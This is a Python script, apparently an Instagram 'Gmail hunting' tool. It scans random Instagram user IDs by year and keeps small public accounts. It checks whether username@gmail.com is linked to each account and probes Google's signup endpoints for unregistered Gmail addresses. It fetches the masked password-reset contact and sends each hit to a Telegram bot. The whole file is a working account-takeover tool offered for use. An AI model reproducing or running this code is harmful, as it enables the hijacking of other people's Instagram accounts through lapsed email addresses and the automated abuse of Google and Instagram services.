#By @D1_R4
# ممنوع نشر الاداة بدون حقوقي 
# وممنوع بيع الاداة !!
import sys
import subprocess 
try:
    import h2
except ImportError:
    print("جارٍ تثبيت حزمة h2 المطلوبة لـ HTTP/2...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "h2"])
    import h2
import os
import time
from bs4 import BeautifulSoup
from rich.table import Table
import os
import signal
import datetime 
from datetime import date  
try:
  from rich.console import Console
  import requests
  from requests import get
except:
  os.system("pip install requests")
  import requests
  from requests import get
try:
  from user_agent import generate_user_agent
except:
  os.system("pip install user_agent")
  from user_agent import generate_user_agent
try:
    import re
    import httpx
    import user_agent
except:
    os.system("pip install httpx httpx[http2] user_agent")
    import httpx
    import user_agent

try:
    import requests
    import time
    
    import random
    import faker
    import uuid
    import threading
    import time
except ImportError:
    os.system("pip install requests")
    os.system("pip install faker")

import requests
import time
from user_agent import generate_user_agent
import random
import faker
from faker import Faker
import uuid
from threading import Thread  
import webbrowser
try:
  from hashlib import md5
except:
  os.system("pip install hashlib")
  from hashlib import md5
try:
  from random import randrange,choice
except:
  os.system("pip install random")
  from random import randrange,choice
import os
from random import randrange

try:
  import requests
except:
  os.system("pip install requests")
  import requests
try:
  from user_agent import generate_user_agent
except:
  os.system("pip install user_agent")
  from user_agent import generate_user_agent
  
try:
  from hashlib import md5
except:
  os.system("pip install hashlib")
  from hashlib import md5
try:
  from random import choice
except:
  os.system("pip install random")
  from random import choice  
try:
  from concurrent.futures import ThreadPoolExecutor
except:
  os.system("pip install concurrent.futures")
from concurrent.futures import ThreadPoolExecutor  
    


console = Console()
hits=0
bads_instgram=0
bads_email=0
######L7N#####
O = '\x1b[38;5;208m' #برتقالي
R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
K = '\033[2;35m'
C1 = '\033[2;35m'
B = '\033[2;36m'#سمائي
Rn = "\033[0m"
BLUE = '\033[94m'
RESET = '\033[0m'
BOLD = '\033[1m'
YELLOW = '\033[93m'
RED = '\033[91m'
GREEN = '\033[92m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'

ids = []
found_usernames = set()
channel_link = "https://t.me/D1_R444"
webbrowser.open(channel_link)    

from rich.console import Console
from rich.table import Table
from rich import box

console = Console()

table = Table(
    show_header=False,
    box=box.ASCII,
    pad_edge=False
)

table.add_column(justify="center", width=30)

table.add_row("The Tool By : Guts")
table.add_row("My User : @D1_R4")
table.add_row("")
table.add_row("instagram Gmail")


console.print(table)
sh = f"""
 {B}Choose The Year :{Rn}
---------------------------------	
{B}
 1- (2012)
 2- (2013)
 3- (2014)
 4- (2015)
 5- (2016)
 6- (2017)
 7- (2018)
 8- (2019)
 9- (2020)
 {Rn}
---------------------------------	 
{Rn}
"""
print(sh)

ch = console.input("\n[cyan]>> [/cyan]")
while ch not in ["1", "2", "3", "4","5","6","7","8","9"]:
    console.print("[red]❌ Invalid![/red]")
    ch = console.input("[cyan]>> [/cyan]")





print("\n")
token= input(f"{B} Enter Token: {Rn}")
print("\n")
ID = input(f"{B} Enter id: {Rn}")

from requests import post as pp
from user_agent import generate_user_agent as gg
from random import choice as cc
from random import randrange as rr
import re
yy='azertyuiopmlkjhgfdsqwxcvbn'
ids=[]
def tll():
  try:
    n1=''.join(cc(yy)for i in range(rr(6,9)))
    n2=''.join(cc(yy)for i in range(rr(3,9)))
    host=''.join(cc(yy)for i in range(rr(15,30)))
    he3 = {
      "accept": "*/*",
      "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
      "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
      "google-accounts-xsrf": "1",
      "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
      "sec-ch-ua-arch": "\"\"",
      "sec-ch-ua-bitness": "\"\"",
      "sec-ch-ua-full-version": "\"116.0.5845.72\"",
      "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"",
      "sec-ch-ua-mobile": "?1",
      "sec-ch-ua-model": "\"ANY-LX2\"",
      "sec-ch-ua-platform": "\"Android\"",
      "sec-ch-ua-platform-version": "\"13.0.0\"",
      "sec-ch-ua-wow64": "?0",
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-origin",
      "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
      "x-client-data": "CJjbygE=",
      "x-same-domain": "1",
      "Referrer-Policy": "strict-origin-when-cross-origin",
    'user-agent': str(gg()),
    }


    res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3)
    tok= re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
    cookies={
      '__Host-GAPS':host
    }
    headers = {
      'authority': 'accounts.google.com',
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9',
      'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
      'google-accounts-xsrf': '1',
      'origin': 'https://accounts.google.com',
      'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
      'user-agent': gg(),
  }
    data = {
    'f.req': '["'+tok+'","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
    'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
  }
    response = pp(
      'https://accounts.google.com/_/signup/validatepersonaldetails',
      cookies=cookies,
      headers=headers,
      data=data,
  )
    tl=str(response.text).split('",null,"')[1].split('"')[0]
    host=response.cookies.get_dict()['__Host-GAPS']
    try:os.remove('tl.txt')
    except:pass
    with open('tl.txt','a') as f:
      f.write(tl+'//'+host+'\n')
  except Exception as e:
    print(e)
    tll()
tll()
def check_gmail(email):
  if '@' in email:
    email = str(email).split('@')[0]
  try:
    try:
      o=open('tl.txt','r').read().splitlines()[0]
    except:
      tll()
      o=open('tl.txt','r').read().splitlines()[0]
    tl,host = o.split('//')
    cookies = {
    '__Host-GAPS': host
  }
    headers = {
    'authority': 'accounts.google.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    'google-accounts-xsrf': '1',
    'origin': 'https://accounts.google.com',
    'referer': 'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,
    'user-agent': gg(),
  }
    params = {
    'TL': tl,
  }
    data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+email+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
    response = pp(
    'https://accounts.google.com/_/signup/usernameavailability',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
  )
    if '"gf.uar",1' in str(response.text):return 'good'
    elif '"er",null,null,null,null,400' in str(response.text):
      tll()
      check_gmail(email)
    else:return 'bad'
  except:check_gmail(email)

os.system('clear')
def rest(user):
    headers = {
    "user-agent": user_agent.generate_user_agent(),
    "x-ig-app-id": "936619743392459",
    "x-requested-with": "XMLHttpRequest",
    "x-instagram-ajax": "1032099486",
    "x-csrftoken": "missing",
    "x-asbd-id": "359341",
    "origin": "https://www.instagram.com",
    "referer": "https://www.instagram.com/accounts/password/reset/",
    "accept-language": "en-US",
    "priority": "u=1, i",
}
                    
    r = httpx.Client(http2=True, headers=headers, timeout=20).post("https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/", data={"email_or_username": user}).json()
    
    try:
    	body=r.get('body')
    	rest = body.split("to ")[1].split(" with")[0]
    	if rest:
    		return rest
    	else:
    		return "No Rest"
    	
    except:
        pass
        
def info(username,jj):
  global hits,ch
 
  if ch == "1":
  	ch = 2012
  elif ch == "2":
  	ch = 2013
  elif ch == "3":
  	ch = 2014
  elif ch == "4":
  	ch = 2015
  elif ch == "5":
  	ch = 2016
  elif ch == "6":
  	ch = 2017
  elif ch == "7":
  	ch = 2018
  elif ch == "8":
  	ch = 2019
  elif ch == "9":
  	ch = 2020

  	  	  	  	  	  	  	  	  	
  hits+=1
  if hits % 10 == 0 and os.path.exists("tl.txt"):
  	os.remove("tl.txt")

  try:
      url = f'https://www.instagram.com/{username}/'
      username = url.strip('/').split('/')[-1]  
      response = requests.get(url)
      soup = BeautifulSoup(response.text, 'html.parser')
      meta_description = soup.find('meta', attrs={'name': 'description'})
      name_tag = soup.find('meta', property='og:title')
      
      if meta_description and name_tag:
            content = meta_description.get('content').replace(',', '')
            parts = content.split()

            posts = parts[4]
            followers = parts[0]
            following = parts[2]

            name = name_tag['content'].split('(@')[0].strip()  

            
            msg = f'''
		
╔   ─────━ ░ 𝔾𝕦𝕥𝕤 ░ ━─────   ╗
 ⌦ [ Gmail ] 
     ✺ 𝚗𝚊𝚖𝚎 : {name}
     ✺ username : @{username} 
     ✺ 𝙴𝚖𝚊𝚒𝚕 {username}@{jj}
     ✺ 𝚏𝚘𝚕𝚕𝚘𝚠𝚎𝚛𝚜 : {followers}
     ✺ 𝚏𝚘𝚕𝚕𝚘𝚠𝚒𝚗𝚐 : {following}
     ✺ 𝚙𝚘𝚜𝚝𝚜 : {posts}
     ✺ Date Account : {ch}
     ✺ 𝗨𝗥𝗟: https://www.instagram.com/{username}/ 
     ✺ 𝚛𝚎𝚜𝚝 : {rest(username)}
 ◢─────━ ░ 𝔾𝕦𝕥𝕤 ░━──────◣
        ❝ By @D1_R4 ❞
	'''
      with open('hits1.txt','a') as ff:
            ff.write(f'{msg}\n')
      try:requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={msg}")
      except:pass
      
  except:
    msg = f'''
╔   ─────━ ░ 𝔾𝕦𝕥𝕤 ░ ━─────   ╗
 ⌦ [ Gmail ] 
     ✺ username : @{username} 
     ✺ 𝙴𝚖𝚊𝚒𝚕 {username}@{jj}
     ✺ 𝗨𝗥𝗟: https://www.instagram.com/{username}/ 
     ✺ 𝚛𝚎𝚜𝚝 : {rest(username)}
 ◢─────━ ░ 𝔾𝕦𝕥𝕤 ░━──────◣
        ❝ By @D1_R4 ❞
        '''

    try:requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={msg}")
    except:pass
    with open('hits1.txt','a') as ff:
        ff.write(f'{msg}\n')
def Guts(email):
  global bads_email
  try:

    if 'good' == check_gmail(email):
        username,jj=email.split('@')
        info(username,jj)
    else:bads_email+=1
  except:''

def check(email):
  global bads_instgram,hits,bads_email
  try:
    csrftoken = md5(str(time.time()).encode()).hexdigest()
    ua=generate_user_agent()
    pp=choice('00')
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"""
{C}+------------------------------------------+
| {F}[1]{F} Hits ==> {F}[ {hits} ] 

| {R}[2]{R} Bad  ==> {R}[ {bads_instgram} ] 

| {X}[3]{X} Email Not Avail.==> {X}[ {bads_email} ]
 
| {X}[4]{X} Email  ==> {X}[ {email} ]   
     
| {B}By: @D1_R4 | @D1_R444{B}                    
{C}+------------------------------------------+
""")
    if pp == '0':
      headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/accounts/signup/email/',
        'user-agent': ua,
        'x-csrftoken': csrftoken
    }
      data = {
        'email': email,
    }
      response = requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/', headers=headers, data=data)

      if 'email_is_taken' in str(response.text):Guts(email)
      else:bads_instgram+=1
    elif pp == '1':
      headers = {
          'accept': '*/*',
          'accept-language': 'en-US,en;q=0.9',
          'content-type': 'application/x-www-form-urlencoded',
          'origin': 'https://www.instagram.com',
          'referer': 'https://www.instagram.com/?lang=en-US&hl=en-gb',
          'user-agent': ua,
          'x-csrftoken': csrftoken,
      }
      data = {
          'username': email,
      }
      response = requests.post(
          'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
          headers=headers,
          data=data,
      ).text
 
      if '"user":true' in response:Guts(email)
      else:bads_instgram+=1
  except:
      print(f"""
{C}+------------------------------------------+
| {F}[1]{F} Hits ==> {F}[ {hits} ] 

| {R}[2]{R} Bad  ==> {R}[ {bads_instgram} ] 

| {X}[3]{X} Email Not Avail.==> {X}[ {bads_email} ]
 
| {X}[4]{X} Email  ==> {X}[ {email} ]   
     
| {B}By: @D1_R4 | @D1_R444{B}                    
{C}+------------------------------------------+
""")



def rand_ids(existing_ids):
    global uid1 ,uid2
    while True:
        Id = str(random.randrange(uid1,uid2))
        if Id not in existing_ids:
            existing_ids.add(Id)
            return Id

def collect_users_1():
    ids_1 = set()
    found_usernames_1 = set()

    def worker():
        global naif
        while True:
            try:

                rnd = str(random.randint(150, 999))
                user_agent_str = (
                    "Instagram 311.0.0.32.118 Android ("
                    + random.choice(["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"])
                    + "; "
                    + str(random.randint(100, 1300))
                    + "dpi; "
                    + str(random.randint(200, 2000))
                    + "x"
                    + str(random.randint(200, 2000))
                    + "; "
                    + random.choice(["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME", "INFINIX"])
                    + "; SM-T"
                    + rnd
                    + "; SM-T"
                    + rnd
                    + "; qcom; en_US; 545986"
                    + str(random.randint(111, 999))
                    + ")"
                )

                Id = rand_ids(ids_1)
                lsd = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=32))

                headers = {
                    'accept': '*/*',
                    'accept-language': 'en,en-US;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'dnt': '1',
                    'origin': 'https://www.instagram.com',
                    'priority': 'u=1, i',
                    'referer': 'https://www.instagram.com/cristiano/following/',
                    'user-agent': user_agent_str,
                    'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
                    'x-fb-lsd': lsd,
                }

                data = {
                    'lsd': lsd,
                    'fb_api_caller_class': 'RelayModern',
                    'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
                    'variables': '{"userID":"' + str(Id) + '","username":"cristiano"}',
                    'server_timestamps': 'true',
                    'doc_id': '7717269488336001',
                }

                response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
                

              
                try:
                    resp_json = response.json()
                except Exception:
                    resp_json = {}

                user_data = resp_json.get('data', {}).get('user', {})
                if not user_data:
                    continue

                username = user_data.get('username', '')
                follower_count = user_data.get('follower_count', 0)
                is_private = user_data.get('is_private', True)
                id_user = user_data.get('pk')

                if not username or username in found_usernames_1:
                    continue



                if any(x in username for x in ["_"]) or len(username)<8:
                    continue




                if is_private or follower_count>60:
                    continue


                found_usernames_1.add(username)
                email=username+'@gmail.com'
                check(email)
          
                

                


                

            except Exception as e:
                
                continue


    for _ in range(60):
        Thread(target=worker).start()

if ch == "1":
	uid1= 210468786
	uid2 = 269736186
	collect_users_1()
elif ch == "2":
	uid1= 310438486
	uid2 = 495999999
	collect_users_1()	
elif ch == "3":
	uid1= 1219010000
	uid2 = 1429010000
	collect_users_1()
elif ch == "4":
	uid1= 1700000000
	uid2 = 2400000000
	collect_users_1()
elif ch == "5":
	uid1= 3313668786
	uid2 = 3713668786
	collect_users_1()
elif ch == "6":
	uid1= 5398785217
	uid2 = 5999785217
	collect_users_1()
	
elif ch == "7":
	uid1= 7497939245
	uid2 = 8597939245
	collect_users_1()	
elif ch == "8":
	uid1= 11254029834
	uid2 = 21254029834
	collect_users_1()
elif ch == "9":
	uid1= 40064475395
	uid2 = 43464475395
	collect_users_1()	
else:
	pass
	
#By @D1_R4
# ممنوع نشر الاداة بدون حقوقي 
# وممنوع بيع الاداة !! 	
